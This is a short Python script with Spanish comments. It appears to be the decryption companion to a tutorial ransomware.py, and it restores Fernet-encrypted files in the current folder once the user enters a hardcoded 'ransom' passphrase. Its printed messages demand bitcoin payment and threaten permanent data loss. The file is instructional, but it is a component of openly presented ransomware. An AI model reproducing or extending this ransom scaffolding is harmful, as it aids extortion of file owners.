#No se incluyen los comentarios ya que si vemos bien, es el mismo código que el de ransomware.py pero modificado para recuperar la información

import os 

from cryptography.fernet import Fernet

files = [ ]

for file in os.listdir():
	
	if file == "ransomware.py" or file == "thekey.key" or file == "decrypt.py":

		continue

	if os.path.isfile(file):

		files.append(file) 


#Vamos a colocar una frase secreta, que servirá para desencriptar el contenido si el usuario paga los bitcoin necesarios. Esta frase será la que permita
# que se ejecute el código de des-encripción que viene a continuación, si no es correcta nunca podrá recuperar los archivos. 

secretphrase = "Dracarys"

userphrase = input ("Ingrese la frase secreta que se le asignó al pagar la recompensa: \n")

if userphrase == secretphrase:

	#No vamos a crear una llave nueva, sino que vamos a cargar la existente en una variable y la usaremos para desencritar la información
	with open ("thekey.key", "rb") as key:
		secretkey = key.read()

	for file in files:

		with open(file, "rb") as thefile:

			contents = thefile.read()

		# Esta sección cambia, ya que ahora usaremos la función de desencripión
		contents_decrypted = Fernet(secretkey).decrypt(contents)

		with open(file, "wb") as thefile:
			thefile.write(contents_decrypted)

	print("Felicidades, sus archivos fueron desencriptados con éxito, muchas gracias por pagar la recompensa")

else:
	print ("La frase secrete es incorrecta, pague la recompensa para recibir la frase que desencriptará sus archivos o preparese para perderlos")


#LISTO, una vez que ejecutemos este código, debemos tener nuestros archivos de vuelta. 
